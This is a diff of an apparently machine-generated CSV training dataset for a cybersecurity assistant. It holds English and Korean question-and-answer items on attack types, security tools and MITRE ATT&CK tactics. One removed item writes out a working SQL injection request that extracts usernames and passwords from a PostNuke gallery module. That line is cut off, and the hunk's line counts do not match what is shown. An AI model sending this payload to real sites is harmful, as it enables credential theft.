@@ -1,66 +1,91 @@
-癤퓁nstruction,input,output
-What is SQL Injection attack?,,a type of cyber attack in which an attacker tries to exploit vulnerabilities in a web application's database layer by injecting malicious SQL statements into a form or input field.
-What is Command Injection attack?,,a type of cyber attack where an attacker executes arbitrary commands on a vulnerable system by exploiting a vulnerability in a web application or other software that allows user input to be passed to the underlying operating system.
-What is XSS (Cross Site Scripting) attack?,,"a type of cyber attack in which an attacker injects malicious code into a vulnerable web application, which is then executed by a victim's browser. The attack typically involves injecting script code into a web page or web application that is then executed when a user visits the page or interacts with the application."
-What is JNDI Injection attack?,,a type of security vulnerability that occurs when an attacker is able to inject malicious data into a Java Naming and Directory Interface (JNDI) lookup operation.
-What is Word Press vulnerability?,,a weakness in the WordPress core software or in one of the many third-party plugins or themes that are commonly used with WordPress.
-What is malicious user-agent?,,a type of user-agent string that is used by attackers or malicious software to disguise their identity and bypass security controls.
-What is attempts to access the admin page attack?,,a type of attack where an adversary attempts to access the administrative or management interface of a web application or network device by guessing or brute-forcing the correct login credentials.
-What is FW?,FW is Firewall.,"a network security device that monitors and controls incoming and outgoing network traffic based on predefined security rules. A firewall acts as a barrier between a trusted internal network and an untrusted external network, such as the internet, and helps prevent unauthorized access to the internal network by blocking or filtering traffic that does not meet certain criteria."
-What is IPS?,IPS is Intrusion Prevention System.,"a network security device that monitors network traffic for signs of malicious activity and can take actions to prevent or stop such activity. An IPS works by inspecting network packets and comparing them to known patterns of malicious traffic, such as known signatures of viruses, malware, or attacks."
-What is IDS?,IDS is Intrusion Detection System.,"a network security device or software application that monitors network traffic for signs of malicious activity. An IDS works by inspecting network packets and comparing them to known patterns of malicious traffic, such as known signatures of viruses, malware, or attacks."
-What is EDR?,EDR is Endpoint Detection and Response.," a type of security technology that is designed to detect and respond to advanced threats on endpoint devices, such as desktops, laptops, servers, and mobile devices. EDR solutions typically use advanced techniques such as behavioral analysis, machine learning, and threat intelligence to detect and respond to threats that may have evaded other security measures."
-What is WAF?,WAF is Web Application Firewall.,"a type of firewall designed specifically to protect web applications from attacks. WAFs sit between the web application and the internet, inspecting and filtering incoming and outgoing web traffic to block attacks and vulnerabilities."
-What is WEB?,"WEB, short for World Wide Web.","a system of interconnected documents and resources, accessed through the internet, that are linked together through hyperlinks and URLs (Uniform Resource Locators). The World Wide Web was invented by Sir Tim Berners-Lee in 1989, and has since become an integral part of modern society, with billions of users accessing web-based resources every day."
-What is APACHE WEB?,,"Apache Web Server, often referred to simply as ""Apache,"" is an open-source web server software that is used to host and serve web content over the internet. Apache is one of the most widely used web servers in the world and is known for its reliability, flexibility, and security."
-What is NGINX WEB?,,"NGINX (pronounced ""engine-x"") is an open-source web server software that is used to host and serve web content over the internet. NGINX is known for its high performance, reliability, and scalability, and is widely used by organizations of all sizes to serve web content and manage web traffic."
-What is IIS WEB?,,"IIS (Internet Information Services) is a web server software developed by Microsoft and is used to host and serve web content over the internet. IIS is specifically designed to work with Windows operating systems, and is included with most versions of Windows."
-What is CVE?,CVE is Common Vulnerabilities and Exposures.,a system used to identify and track publicly known cybersecurity vulnerabilities and exposures in software and hardware products.
-What is Sigma Rule?,,"a flexible and open-source format for describing detection rules used in security information and event management (SIEM) systems, intrusion detection systems (IDS), and other security tools. Sigma rules are designed to be simple, portable, and easy to write, modify, and share."
-What is Snort Rule?,,Snort is a widely used open-source intrusion detection and prevention system that can analyze network traffic in real-time to detect and prevent malicious activity. A Snort rule is a text-based rule that describes the conditions for detecting specific types of traffic or activity on a network.
-What is YARA Rule?,,YARA is an open-source tool designed to help malware researchers and security professionals identify and classify malware samples based on patterns and rules. YARA rules are text-based and describe patterns or characteristics that can be used to identify a specific type of file or code.
-What is Mitre Att&ck matrix?,,a globally accessible knowledge base of adversary tactics and techniques that are used during cyberattacks. It is a comprehensive model of real-world attack techniques used by adversaries to compromise and exfiltrate sensitive information from targeted systems.
-How many enterprise Tactics IDs are in the Mitre Att&ck v13 matrix released in April 2023?,"The Mitre Att&ck v13, announced in April 2023, consists of a total of 14 Enterprise Tactics IDs, including TA0001 (Initial Access), TA0002 (Execution), TA0003 (Persistence), TA0004 (Privilege Escalation), TA0005 (Defense Evasion), TA0006 (Credential Access), TA0007 (Discovery), TA0008 (Lateral Movement), TA0009 (Collection), TA0010 (Exfiltration), TA0011 (Command and Control), TA0040 (Impact), TA0042 (Resource Development), and TA0043 (Reconnaissance).",The Mitre Att&ck v13 matrix released in April 2023 has a total of 14 Enterprise Tactics IDs.
-What is TA0043 (Reconnaissance)?,,The adversary is trying to gather information they can use to plan future operations.
-What is TA0042 (Resource Development)?,,The adversary is trying to establish resources they can use to support operations.
-What is TA0001 (Initial Access)?,,The adversary is trying to get into your network.
-What is TA0002 (Execution)?,,The adversary is trying to run malicious code.
-What is TA0003 (Persistence)?,,The adversary is trying to maintain their foothold.
-What is TA0004 (Privilege Escalation)?,,The adversary is trying to gain higher-level permissions.
-What is TA0005 (Defense Evasion)?,,The adversary is trying to avoid being detected.
-What is TA0006 (Credential Access)?,,The adversary is trying to steal account names and passwords.
-What is TA0007 (Discovery)?,,The adversary is trying to figure out your environment.
-What is TA0008 (Lateral Movement)?,,The adversary is trying to move through your environment.
-What is TA0009 (Collection)?,,The adversary is trying to gather data of interest to their goal.
-What is TA0011 (Command and Control)?,,The adversary is trying to communicate with compromised systems to control them.
-What is TA0010 (Exfiltration)?,,The adversary is trying to steal data.
-What is TA0040 (Impact)?,,"The adversary is trying to manipulate, interrupt, or destroy your systems and data."
-Explain the following payload.,"Payload is GET /jenkins/postnuke/index.php?module=My_eGallery&do=showpic&pid=-1/**/AND/**/1=2/**/UNION/**/ALL/**/SELECT/**/0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,concat(0x3C7230783E,pn_uname,0x3a,pn_pass,0x3C7230783E),0,0,0/**/FROM/**/md_users/**/WHERE/**/pn_uid=$id/* HTTP/1.1
+s,instruction_ko,input,input_ko,gpt40_answer,gpt40_answer_ko
+Hi,안녕,,,"hello! how may i assist you with your security analysis needs? if you have any questions or concerns related to security, feel free to ask.",안녕하세요! 보안 분석 관련 도움이 필요하시면 언제든지 연락주세요. 보안 관련 질문이나 문제가 있으시면 편하게 말씀해 주세요.
+Hello,안녕하세요,,,"hello! how can i help you today? as a security analyst, i can provide guidance on security measures, analyze potential threats, and suggest ways to improve the security of your organization or personal assets. if you have any questions or concerns, feel free to ask.","안녕하세요! 오늘 어떻게 도와드릴까요? 보안 분석가로서, 보안 조치에 대한 지침을 제공하거나 잠재적 위협을 분석하고 조직이나 개인 자산의 보안을 개선할 수 있는 방법을 제안할 수 있습니다. 질문이나 우려 사항이 있으시면 언제든지 말씀해주세요."
+What is your job?,너의 직업은 무엇이야?,,,"as a security analyst, my job involves ensuring the security of an organization's computer systems, networks, and sensitive data. this includes monitoring, detecting, analyzing, and preventing cyber threats or security breaches. my responsibilities may include:  1. regularly assessing the vulnerabilities and risk levels in systems and networks 2. implementing and maintaining security tools, processes, and controls 3. monitoring and analyzing security events and logs for potential threats 4. conducting security audits and penetration tests to identify weaknesses in systems 5. ensuring that security policies, procedures, and best practices are followed 6. staying up-to-date on the latest trends and emerging threats in cybersecurity 7. responding to and mitigating security incidents, and coordinating with relevant stakeholders during incident response 8. providing guidance and training to improve the security awareness of an organization's employees 9. recommending and implementing upgrades and improvements to security systems to address deficiencies or comply with regulatory requirements 10. collaborating with it, legal, and human resources departments to ensure a comprehensive security strategy is in place.","보안 분석가로서 제 업무는 조직의 컴퓨터 시스템, 네트워크 및 민감한 데이터의 보안을 보장하는 것입니다. 이는 사이버 위협이나 보안 침해를 모니터링, 탐지, 분석 및 예방하는 것을 포함합니다. 제 책임은 다음과 같습니다.  1. 시스템 및 네트워크의 취약성과 위험 수준을 정기적으로 평가 2. 보안 도구, 프로세스 및 제어를 구현하고 유지 관리 3. 잠재적인 위협을위한 보안 이벤트 및 로그 모니터링 및 분석 4. 시스템의 약점을 찾는 보안 감사와 침투 테스트를 실시 5. 보안 정책, 절차 및 모범 사례가 준수되는지 확인 6. 최신 트렌드와 사이버 보안의 신흥 위협에 대해 최신 정보 제공 7. 보안 사건에 대응 및 완화하고, 사건 대응 중 관련 이해당사자와 협력 8. 조직의 직원들의 보안 인식을 향상시키기 위한 지침 및 교육 제공 9. 미비 사항을 해결하거나 규제 요건을 충족하기 위해 보안 시스템을 업그레이드하고 개선하는 것을 추천 및 구현 10. 종합적인 보안 전략이 구축되도록 it, 법무 및 인사 부서와 협력."
+What is SQL Injection attack?,SQL Injection 공격에 대해서 설명해줘.,,,"sql injection is a cyber attack technique where an attacker exploits vulnerabilities in a web application's database layer by injecting malicious sql code through user inputs. this allows the attacker to execute unauthorized queries, manipulate, or even delete data in the database. as a result, an attacker could gain unauthorized access to sensitive information, modify records, or execute administrative tasks on the targeted system.","sql injection은 공격자가 사용자 입력을 통해 악의적인 sql 코드를 삽입하여 웹 응용 프로그램의 데이터베이스 계층에서 취약점을 이용하는 사이버 공격 기술입니다. 이를 통해 공격자는 데이터베이스에서 인증되지 않은 쿼리를 실행하거나 데이터를 조작하거나 삭제할 수 있습니다. 따라서 공격자는 민감한 정보에 인증되지 않은 접근을 획득할 수 있고, 기록을 수정하거나 대상 시스템에서 관리 작업을 실행할 수 있습니다."
+What is Command Injection attack?,Command Injection 공격에 대해서 설명해줘.,,,"a command injection attack is a cybersecurity threat in which an attacker gains unauthorized access to an application by executing arbitrary commands on its underlying operating system. the attack is typically carried out by exploiting insufficient input validation, enabling the manipulation of user input to inject malicious code. this vulnerability can lead to sensitive data exposure, unauthorized system access, or even complete system compromise.","command injection 공격은 공격자가 프로그램의 기본 운영 체제에 임의의 명령을 실행하여 권한이 없는 응용 프로그램에 액세스하는 사이버 보안 위협입니다. 이 공격은 일반적으로 입력 유효성 검사가 미흡하여 사용자 입력을 조작하여 악성 코드를 주입하는 방식으로 이루어집니다. 이런 취약점으로 인해 민감한 데이터 노출, 무단 시스템 접근 또는 전체 시스템 침해가 발생할 수 있습니다."
+What is XSS (Cross Site Scripting) attack?,XSS (Cross Site Scripting) 공격에 대해서 설명해줘.,,,"xss (cross site scripting) attack is a type of web application vulnerability where malicious scripts are injected into trusted websites. the attacker aims to execute these scripts in the browser of victim users, usually to steal their information or perform actions on their behalf. this can lead to compromised user experience, data theft, and other security issues.",크로스 사이트 스크립팅(xss) 공격은 악의적인 스크립트를 신뢰할 수 있는 웹 사이트에 삽입하여 발생하는 웹 애플리케이션 취약점 유형입니다. 공격자는 피해자 사용자의 브라우저에서 이러한 스크립트를 실행하려고 합니다. 그것은 주로 사용자의 정보를 훔치거나 그들을 대신해서 작업을 수행하기 위한 것입니다. 이로 인해 사용자 경험이 손상되거나 데이터가 도난당하며 기타 보안 문제가 발생할 수 있습니다.
+What is JNDI Injection attack?,JNDI Injection 공격에 대해서 설명해줘.,,,"jndi injection attack is a type of security vulnerability that exploits the java naming and directory interface (jndi) service, which enables java applications to discover and interact with network services and resources. in this attack, an attacker injects malicious jndi references into a java application, causing it to look up and execute unwanted code or resources from a remote server. this can lead to unauthorized access, data theft, or remote code execution, compromising the security and integrity of the affected system.","jndi injection 공격은 java naming and directory interface(jndi) 서비스를 이용한 보안 취약점 유형입니다. jndi 서비스는 java 애플리케이션을 통해 네트워크 서비스와 자원을 찾고 상호 작용할 수 있게 해줍니다. 이 공격에서 공격자는 악의적인 jndi 참조를 java 애플리케이션에 주입하여 원격 서버에서 원치 않는 코드나 자원을 찾아 실행하게 합니다. 이로 인해 무단 접근, 데이터 도난 또는 원격 코드 실행이 발생하여 해당 시스템의 보안 및 무결성이 손상될 수 있습니다."
+What is Word Press vulnerability?,Word Press 취약점에 대해서 설명해줘.,,,"wordpress vulnerability refers to any exploitable weakness or flaw present in the wordpress platform or its associated plugins and themes. these vulnerabilities can be targeted by hackers to gain unauthorized access, steal sensitive information, or disrupt website operations. common examples of wordpress vulnerabilities are sql injection, cross-site scripting (xss), and weak credentials.","word press 취약점은 워드프레스 플랫폼 또는 관련 플러그인과 테마에 존재하는 모든 공격 가능한 약점이나 결함을 의미합니다. 이러한 취약점들은 해커들이 무단 접근을 하거나 민감한 정보를 훔치거나 웹사이트 작동을 방해하는 목적으로 공격 대상이 될 수 있습니다. 워드프레스 취약점의 일반적인 예로는 sql 인젝션, 크로스 사이트 스크립팅(xss), 약한 인증 정보 등이 있습니다."
+What is malicious user-agent?,악성 User-Agent에 대해서 설명해줘.,,,"a malicious user-agent refers to a web browsing tool, script, or software utilized by cyber attackers or hackers to perform unauthorized activities or gain nefarious access to web resources. these tools disguise themselves as regular user-agents to bypass security measures and extract sensitive information or exploit vulnerabilities in web applications. detecting and blocking such user-agents can significantly improve the overall security of a web application, preventing cyberattacks and data breaches.","악의적인 사용자 에이전트는 사이버 공격자나 해커가 웹 리소스에 불법적인 활동을 수행하거나 악의적인 접근을 획득하기 위해 사용하는 웹 브라우징 도구, 스크립트 또는 소프트웨어를 의미합니다. 이러한 도구들은 정상적인 사용자 에이전트로 위장하여 보안 조치를 우회하고, 웹 애플리케이션의 취약점을 공략하거나 민감한 정보를 추출합니다. 악의적인 사용자 에이전트를 탐지하여 차단하는 것은 웹 애플리케이션의 전반적인 보안을 크게 향상시키는 데 기여할 수 있어, 사이버 공격 및 데이터 유출을 방지할 수 있습니다."
+What is attempts to access the admin page attack?,관리자 페이지 접근 시도 공격에 대해서 설명해줘.,,,"attempts to access the admin page attack refers to unauthorized efforts by cybercriminals to gain entry to the administrative interfaces of a website, application, or system. these attacks often involve brute force, exploiting weak passwords and known vulnerabilities, with the goal of taking control of the targeted entity. if successful, attackers can modify system configurations, steal sensitive data, or even launch further attacks on connected systems or users.","관리자 페이지 공격은 전문가에 의한 인증되지 않은 웹 사이트, 응용 프로그램 또는 시스템의 관리 인터페이스에 대한 접근을 시도하는 것을 의미합니다. 이러한 공격은 종종 무작위 대입 공격, 약한 비밀번호 및 알려진 취약점을 악용하며, 목표 시스템을 제어할 수 있는 권한을 얻기 위한 것입니다. 공격이 성공한다면, 공격자들은 시스템 구성을 수정하거나 민감한 정보를 훔치거나, 심지어 연결된 시스템이나 사용자에게 추가 공격을 가할 수 있습니다."
+What is FW?,FW가 뭐야?,FW is Firewall.,FW는 Firewall의 줄임말 이다.,"a firewall (fw) is a network security system that monitors and controls incoming and outgoing network traffic based on predetermined security rules. it establishes a barrier between a trusted internal network and untrusted external networks, such as the internet. firewalls help protect networks and devices from unauthorized access, malicious activities, and security threats.","방화벽(fw)은 미리 정해진 보안 규칙에 따라 들어오고 나가는 네트워크 트래픽을 모니터링하고 제어하는 네트워크 보안 시스템입니다. 방화벽은 신뢰할 수 있는 내부 네트워크와 신뢰할 수 없는 외부 네트워크(예: 인터넷) 사이에 장벽을 구축합니다. 방화벽은 네트워크와 기기를 무단 접근, 악의적 활동, 보안 위협으로부터 보호하는 데 도움을 줍니다."
+What is IPS?,IPS가 뭐야?,IPS is Intrusion Prevention System.,IPS는 Intrusion Prevention System의 줄임말 이다.,"ips (intrusion prevention system) is a network security tool designed to identify and prevent cyber threats in real-time. it actively scans network traffic to detect potential vulnerabilities, malicious activities, or policy violations. upon identifying any suspicious behavior, the ips takes immediate actions, like blocking the traffic, to protect the network from potential harm.","침입 방지 시스템(ips)은 실시간으로 사이버 위협을 식별하고 예방하기 위해 설계된 네트워크 보안 도구입니다. 이 도구는 네트워크 트래픽을 적극적으로 스캔하여 잠재적 취약점, 악의적 활동 또는 정책 위반을 탐지합니다. 의심스러운 행동을 발견하면 ips는 트래픽을 차단하는 등의 즉각적인 조치를 취해 네트워크가 잠재적인 위험으로부터 보호받을 수 있습니다."
+What is IDS?,IDS가 뭐야?,IDS is Intrusion Detection System.,IDS는 Intrusion Detection System의 줄임말 이다.,"an intrusion detection system (ids) is a security solution that scans network traffic for potential malicious activity, such as attempts to breach or exploit a system. it utilizes various techniques, including signature-based detection and anomaly-based detection, to identify threats and alert security personnel. in this way, ids plays a crucial role in protecting sensitive information from cyber attacks and maintaining the overall security of a network.",침입 탐지 시스템(ids)은 네트워크 트래픽을 스캔하여 시스템 침입이나 악용 시도와 같은 잠재적 악성 활동을 찾아내는 보안 솔루션입니다. 이 시스템은 서명 기반 탐지 방법 및 이상 탐지 방법을 사용하여 위협을 식별하고 보안 담당자에게 경고합니다. 이렇게하여 ids는 사이버 공격으로부터 민감한 정보를 보호하고 네트워크의 전반적인 보안을 유지하는 데 중요한 역할을 합니다.
+What is EDR?,EDR이 뭐야?,EDR is Endpoint Detection and Response.,EDR은 Endpoint Detection and Response의 줄임말 이다.,"endpoint detection and response (edr) is a cybersecurity technology that monitors endpoint activities and gathers data to detect, investigate, and combat potential threats in real-time. edr solutions provide continuous visibility and analysis of endpoint behavior, allowing organizations to identify and remediate security breaches promptly. this advanced approach to endpoint protection helps businesses proactively prevent cyberattacks and minimize damages by enhancing threat detection, response, and remediation capabilities.","엔드포인트 탐지 및 대응(edr)은 엔드포인트 활동을 모니터링하고 데이터를 수집하여 실시간으로 잠재적 위협을 탐지, 조사, 대응하는 사이버 보안 기술입니다. edr 솔루션은 엔드포인트 행동에 대한 지속적인 가시성과 분석을 제공함으로써 조직이 보안 침해사항을 신속하게 파악하고 개선할 수 있도록 지원합니다. 이러한 고급 엔드포인트 보호 접근 방식은 위협 탐지, 대응 및 개선 능력을 강화하여 기업이 사이버 공격을 예방하고 피해를 최소화하는데 도움이됩니다."
+What is WAF?,WAF가 뭐야?,WAF is Web Application Firewall.,WAF는 Web Application Firewall의 줄임말 이다.,"a web application firewall (waf) is a security solution designed to protect web applications from various threats, such as sql injections, cross-site scripting, and other malicious attacks. it functions as a protective barrier by monitoring and filtering incoming http/https requests, allowing only legitimate traffic to access the application. this enhances the security of web applications, helps in preventing data breaches, and ensures compliance with industry-specific regulations.","웹 애플리케이션 방화벽(waf)은 sql 인젝션, 크로스 사이트 스크립팅 및 기타 악의적 공격과 같은 다양한 위협으로부터 웹 애플리케이션을 보호하기 위해 설계된 보안 솔루션입니다. 이는 들어오는 http/https 요청을 모니터링하고 필터링하여 오직 합법적인 트래픽만 애플리케이션에 접근할 수 있도록 하는 보호 장벽 역할을 합니다. 이를 통해 웹 애플리케이션의 보안성을 강화하고, 데이터 유출을 방지하며, 업계 특정 규정 준수를 보장합니다."
+What is WEB?,WEB이 뭐야?,"WEB, short for World Wide Web.",WEB은 World Wide Web의 줄임말 이다.,"the world wide web (web) is a global information space that allows people to access and share information using documents, images, and multimedia resources. it relies on the internet infrastructure and uses hypertext transfer protocol (http) to enable the retrieval and display of content through web browsers. invented by sir tim berners-lee in 1989, the web has revolutionized communication, education, and business worldwide.","월드와이드웹(web)은 문서, 이미지 및 멀티미디어 리소스를 사용하여 정보를 접근하고 공유할 수 있는 글로벌 정보 공간입니다. 인터넷 인프라에 의존하며 하이퍼텍스트 전송 프로토콜(http)을 사용하여 웹 브라우저를 통해 콘텐츠를 검색하고 표시할 수 있습니다. 1989년에 팀 버너스리 경에 의해 발명된 웹은 전 세계의 커뮤니케이션, 교육, 비즈니스에 혁명을 일으켰습니다."
+What is APACHE WEB?,APACHE WEB이 뭐야?,,,"apache web, also known as the apache http server, is a widely-used, open-source web server software that provides hosting and serving of web pages, applications, and online services. it was developed by the apache software foundation and has been a significant player in the growth of the world wide web since its release in 1995. the apache web server is known for its flexibility, reliability, and strong support for multiple platforms, programming languages, and server-side scripting modules.","아파치 웹, 즉 아파치 http 서버는 웹 페이지, 응용 프로그램 및 온라인 서비스의 호스팅과 제공을 지원하는 널리 사용되는 오픈 소스 웹 서버 소프트웨어입니다. 이것은 아파치 소프트웨어 재단에 의해 개발되었으며, 1995년 출시 이래 월드 와이드 웹의 성장에서 중요한 역할을 해 왔습니다. 아파치 웹 서버는 다양한 플랫폼, 프로그래밍 언어 및 서버 측 스크립팅 모듈에 대한 강력한 지원 때문에 유연성, 신뢰성 및 유연성으로 알려져 있습니다."
+What is NGINX WEB?,NGINX WEB이 뭐야?,,,"nginx is a high-performance web server, reverse proxy, and load balancer, initially released in 2004. it is designed to efficiently serve multiple concurrent connections by using an event-driven architecture. nginx offers fast, efficient, and highly-scalable web service for delivering static and dynamic content, often making it an ideal choice for high-traffic websites and web applications.","nginx는 2004년에 처음 출시된 고성능 웹 서버, 리버스 프록시, 로드 밸런서입니다. 이것은 이벤트 기반 아키텍처를 사용하여 여러 동시 연결을 효율적으로 제공하도록 설계되었습니다. nginx는 정적 및 동적 콘텐츠를 빠르고 효율적이며 고도로 확장 가능한 웹 서비스를 제공하므로, 종종 고 트래픽 웹 사이트 및 웹 애플리케이션에 이상적인 선택이 됩니다."
+What is IIS WEB?,IIS WEB이 뭐야?,,,"iis (internet information services) web is a versatile web server created by microsoft, used to host and manage websites, applications, and web services on windows platforms. it supports multiple protocols like http, https, ftp, and ftps and offers various tools to simplify configuration, management, and access control. iis web provides vital features, including load balancing, website monitoring, and in-built security for robust, scalable, and secure web solutions.","iis(인터넷 정보 서비스) 웹은 마이크로소프트에서 개발한 다목적 웹 서버로, 윈도우 플랫폼에서 웹 사이트, 응용 프로그램 및 웹 서비스를 호스트하고 관리하는 데 사용됩니다. 이는 http, https, ftp 및 ftps와 같은 여러 프로토콜을 지원하며 설정, 관리 및 액세스 제어를 간소화하는 다양한 도구를 제공합니다. iis 웹은 로드 밸런싱, 웹 사이트 모니터링 및 기본 보안등의 중요한 기능을 제공하여 견고하고 확장 가능하며 보안이 강화된 웹 솔루션을 구축할 수 있습니다."
+What is CVE?,CVE가 뭐야?,CVE is Common Vulnerabilities and Exposures.,CVE는 Common Vulnerabilities and Exposures의 줄임말 이다.,"cve, or common vulnerabilities and exposures, is a public database and standardized system for referencing and identifying known security vulnerabilities and exposures in software or applications. it provides a unique identifier for each vulnerability, allowing security researchers, developers, and organizations to easily track and share information regarding these threats. managed by the mitre corporation, cve aids in improving cybersecurity and promoting collaboration within the global security community.","cve, 또는 common vulnerabilities and exposures은 소프트웨어 또는 애플리케이션의 알려진 보안 취약점 및 노출에 대한 참조와 식별을위한 표준화된 시스템 및 공개 데이터베이스입니다. 각 취약점에 대해 고유 식별자를 제공하여 보안 연구원, 개발자 및 조직이 이러한 위협에 대한 정보를 쉽게 추적하고 공유할 수 있습니다. mitre corporation이 관리하는 cve는 글로벌 보안 커뮤니티 내에서의 협업을 촉진하며 사이버 보안을 향상시키는데 도움이 됩니다."
+What is Sigma Rule?,Sigma Rule이 뭐야?,,,"sigma rule is a generic and open-source rule format for expressing security information and event management (siem) and log management correlation rules. it aims to provide a standardized language that can be easily shared and understood across different platforms and solutions. by using sigma, security analysts can more efficiently create, maintain, and share rules, improving the overall detection and response capabilities in cyber defense.","sigma rule은 보안 정보 및 이벤트 관리 (siem) 및 로그 관리 상관 규칙을 표현하기 위한 범용적이고 오픈 소스 규칙 형식입니다. 이를 통해 표준화된 언어를 제공하여 다양한 플랫폼 및 솔루션 간에 쉽게 공유하고 이해할 수 있습니다. sigma를 사용하면 보안 분석가들이 규칙을 보다 효율적으로 생성, 유지 및 공유할 수 있어 사이버 방어에서 전반적인 탐지 및 대응 능력을 향상시킬 수 있습니다."
+What is Snort Rule?,Snort Rule이 뭐야?,,,"snort rule is a customizable detection and prevention mechanism used in the snort intrusion detection system (ids) to identify and block suspicious activities on a network. it comprises a set of parameters that specify the target protocol, ip addresses, port numbers, and the signature pattern which may indicate malicious behavior. these rules allow network administrators to define policies that strengthen network security, alert on potential threats, and prevent unauthorized access and activities.","snort rule은 snort 침입 탐지 시스템(ids)에서 사용되는 맞춤형 탐지 및 예방 메커니즘으로, 네트워크상의 의심스러운 활동을 식별하고 차단합니다. 이 규칙은 목표 프로토콜, ip 주소, 포트 번호, 악의적 행동을 나타낼 수 있는 시그니처 패턴과 같은 일련의 매개변수로 구성됩니다. 이러한 규칙은 네트워크 관리자가 네트워크 보안 강화를 위한 정책을 정의하고, 잠재적 위협에 대한 경고를 보내며, 무단 접근 및 활동을 방지할 수 있도록 돕습니다."
+What is YARA Rule?,YARA Rule이 뭐야?,,,"yara rule is a powerful and flexible tool used for identifying, detecting, and analyzing malicious patterns or specific characteristics in files, typically in the context of cybersecurity and digital forensics. it uses a rule-based language that allows researchers to create and share rules for identifying malware or other threats based on their unique signatures. yara rules enhance threat detection and collaboration among security professionals by providing a standardized way to describe and detect malware families, exploits, or other suspicious behaviors in a fast and efficient manner.","yara rule은 일반적으로 사이버 보안 및 디지털 포렌식과 관련하여 파일에서 악의적 패턴 또는 특정 특성을 식별, 검출 및 분석하는 데 사용되는 강력하고 유연한 도구입니다. 이는 규칙 기반 언어를 사용하여 연구원들이 악성 코드나 기타 위협을 고유한 서명 기반으로 식별하는 규칙을 생성하고 공유할 수 있게 합니다. yara 규칙은 보안 전문가들 사이에서 협업을 강화하고 악성코드 가족, 익스플로잇(exploit) 또는 기타 의심스러운 행동을 빠르고 효율적으로 설명하고 검출할 수 있는 표준화된 방법을 제공함으로써 위협 탐지를 향상시킵니다."
+What is Mitre Att&ck matrix?,Mitre Att&ck matrix가 뭐야?,,,"the mitre att&ck matrix is a comprehensive, globally accessible knowledge base of cyber adversary tactics and techniques, based on real-world observations, aimed at assisting in the development of threat-informed defense strategies. it organizes these tactics and techniques into a matrix and helps organizations to better understand cyber threats, identify vulnerabilities, and prioritize mitigations. by utilizing the att&ck matrix, security teams can enhance their threat detection, investigation, and response capabilities, thus improving overall cybersecurity posture.","mitre att&ck matrix는 실제 세계의 관측을 기반으로 한 사이버 공격자 전술 및 기술에 관한 포괄적이고 전 세계적으로 접근 가능한 지식 기반을 제공하며, 위협 중심의 방어 전략 개발을 지원합니다. 이 매트릭스는 이러한 전술 및 기술을 매트릭스에 구성하며 조직이 사이버 위협을 더 잘 이해하고 취약점을 파악하며 완화 우선 순위를 결정하는 데 도움을 줍니다. att&ck 매트릭스를 활용하면 보안 팀이 위협 감지, 조사 및 대응 능력을 향상시켜 전체 사이버 보안 자세를 개선할 수 있습니다."
+How many enterprise Tactics IDs are in the Mitre Att&ck v13 matrix released in April 2023?,Mitre Att&ck v13 matrix의 Enterprise Tactics ID는 몇 개입니까?,"The Mitre Att&ck v13, announced in April 2023, consists of a total of 14 Enterprise Tactics IDs, including TA0001 (Initial Access), TA0002 (Execution), TA0003 (Persistence), TA0004 (Privilege Escalation), TA0005 (Defense Evasion), TA0006 (Credential Access), TA0007 (Discovery), TA0008 (Lateral Movement), TA0009 (Collection), TA0010 (Exfiltration), TA0011 (Command and Control), TA0040 (Impact), TA0042 (Resource Development), and TA0043 (Reconnaissance).","2023년 4월에 발표된 Mitre Att&ck v13은 TA0001 (Initial Access), TA0002 (Execution), TA0003 (Persistence), TA0004 (Privilege Escalation), TA0005 (Defense Evasion), TA0006 (Credential Access), TA0007 (Discovery), TA0008 (Lateral Movement), TA0009 (Collection), TA0010 (Exfiltration), TA0011 (Command and Control), TA0040 (Impact), TA0042 (Resource Development), and TA0043 (Reconnaissance) 총 14개 입니다.","the mitre att&ck v13 matrix, released in april 2023, contains a total of 14 enterprise tactics ids that outline various stages of a cyber attack. these tactics ids range from ta0001 (initial access) to ta0043 (reconnaissance) and cover critical aspects such as execution, persistence, defense evasion, and impact. this comprehensive matrix assists organizations in identifying and mitigating potential threats and understanding the different attack techniques used by adversaries.","mitre att&ck v13 matrix는 2023년 4월에 출시되었으며, 사이버 공격의 여러 단계를 개요하는 14개의 enterprise tactics id를 포함하고 있습니다. 이러한 tactics id는 ta0001 (초기 접근)부터 ta0043 (정찰)에 이르기까지 다양한 범위를 포괄하며 실행, 지속성, 방어 회피 및 영향과 같은 중요한 측면을 다룹니다. 이 포괄적인 matrix는 조직이 잠재적인 위협을 식별하고 완화하고 적들이 사용하는 다양한 공격 기법을 이해하는 데 도움이 됩니다."
+How many enterprise Tactics IDs in the Mitre Att&ck v13 matrix?,Mitre Att&ck v13 matrix의 Enterprise Tactics ID는 몇 개입니까?,"The Mitre Att&ck v13, announced in April 2023, consists of a total of 14 Enterprise Tactics IDs, including TA0001 (Initial Access), TA0002 (Execution), TA0003 (Persistence), TA0004 (Privilege Escalation), TA0005 (Defense Evasion), TA0006 (Credential Access), TA0007 (Discovery), TA0008 (Lateral Movement), TA0009 (Collection), TA0010 (Exfiltration), TA0011 (Command and Control), TA0040 (Impact), TA0042 (Resource Development), and TA0043 (Reconnaissance).","2023년 4월에 발표된 Mitre Att&ck v13은 TA0001 (Initial Access), TA0002 (Execution), TA0003 (Persistence), TA0004 (Privilege Escalation), TA0005 (Defense Evasion), TA0006 (Credential Access), TA0007 (Discovery), TA0008 (Lateral Movement), TA0009 (Collection), TA0010 (Exfiltration), TA0011 (Command and Control), TA0040 (Impact), TA0042 (Resource Development), and TA0043 (Reconnaissance) 총 14개 입니다.","the mitre att&ck v13 matrix, released in april 2023, comprises 14 enterprise tactics ids. these tactics include initial access, execution, persistence, privilege escalation, defense evasion, credential access, discovery, lateral movement, collection, exfiltration, command and control, impact, resource development, and reconnaissance. each tactic consists of different techniques utilized by cyber adversaries to exploit and compromise enterprise networks and systems.","mitre att&ck v13 matrix는 2023년 4월에 출시되었으며, 14개의 enterprise tactics id가 포함되어 있습니다. 이러한 전술에는 초기 접근, 실행, 지속성, 권한 상승, 방어 회피, 자격 증명 접근, 발견, 수평 이동, 수집, 엑스 필트레이션, 커맨드 및 컨트롤 및 영향, 리소스 개발 및 정찰이 포함됩니다. 각 전략은 사이버 적들이 기업 네트워크와 시스템을 공격하고 침투하는데 활용하는 다양한 기술로 구성되어 있습니다."
